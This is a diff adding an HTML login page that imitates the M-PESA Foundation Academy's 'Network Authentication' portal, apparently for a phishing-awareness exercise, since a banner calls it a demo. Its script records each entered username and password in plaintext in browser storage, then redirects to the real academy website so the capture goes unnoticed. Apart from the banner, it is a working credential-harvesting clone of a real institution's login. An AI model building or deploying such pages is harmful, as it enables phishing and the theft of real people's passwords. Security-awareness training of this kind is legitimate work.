@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>M-PESA Foundation Academy — Login</title>
+<style>
+  body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#f4f6f9;color:#222;}
+  .page{min-height:100vh;display:flex;align-items:center;justify-content:center;}
+  .card{width:380px;max-width:95%;background:#fff;border-radius:8px;box-shadow:0 8px 28px rgba(15,23,42,0.1);padding:32px;text-align:center;}
+  .logo{width:200px;margin:0 auto 18px;display:block;}
+  h1{font-size:20px;color:#2b5e90;margin:0 0 12px;}
+  .field{display:block;width:100%;padding:12px;border-radius:6px;border:1px solid #ddd;margin-bottom:14px;background:#f9fafb;}
+  .login-btn{width:100%;padding:12px;background:#4fa03e;color:#fff;border:0;border-radius:6px;font-weight:600;cursor:pointer;}
+  .footer{margin-top:16px;font-size:13px;color:#555;}
+  .mock-badge{position:fixed;left:18px;top:18px;background:#fff7cc;color:#92400e;padding:8px 12px;border-radius:6px;font-weight:700;}
+</style>
+</head>
+<body>
+  <div class="mock-badge">DEMO LOGIN — DO NOT USE REAL CREDENTIALS</div>
+  <main class="page">
+    <section class="card">
+      <img src="https://dummyimage.com/200x60/fff/3b8b3b&text=M-PESA+FOUNDATION+ACADEMY" alt="logo" class="logo"/>
+      <h1>Network Authentication</h1>
+      <form id="loginForm">
+        <input class="field" type="text" id="username" placeholder="Enter Username" required>
+        <input class="field" type="password" id="password" placeholder="Enter Password" required>
+        <button class="login-btn" type="submit">Login</button>
+      </form>
+      <div class="footer">Curiosity • Leadership • Innovation</div>
+    </section>
+  </main>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e){
+      e.preventDefault();
+      const user = document.getElementById("username").value.trim();
+      const pass = document.getElementById("password").value.trim();
+
+      // Save attempt for trainer review
+      const attempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];
+      attempts.push({ username: user, password: pass, time: new Date().toLocaleString() });
+      localStorage.setItem("loginAttempts", JSON.stringify(attempts));
+
+      // Redirect to official Academy website
+      window.location.href = "https://mpesafoundationacademy.ac.ke/";
+    });
+  </script>
+</body>
+</html>
